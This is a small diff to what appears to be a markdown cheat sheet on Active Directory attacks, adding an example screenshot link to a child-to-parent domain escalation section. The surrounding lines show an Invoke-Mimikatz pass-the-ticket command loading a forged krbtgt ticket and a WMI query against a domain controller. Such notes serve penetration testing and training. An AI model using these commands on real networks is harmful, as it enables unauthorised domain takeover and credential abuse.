@@ -607,5 +607,8 @@ Invoke-Mimikatz -Command '"kerberos::ptt C:\test\krbtgt_tkt.kirbi"'
 # Check
 gwmi -class win32_operatingsystem -ComputerName mcorp-dc.corporate.local
 ```
+**Example:**
+
+![Main Logo](images/Example_Child_to_parent01.PNG 'Example04')
 
 ### Across Forest using Trust Tickets
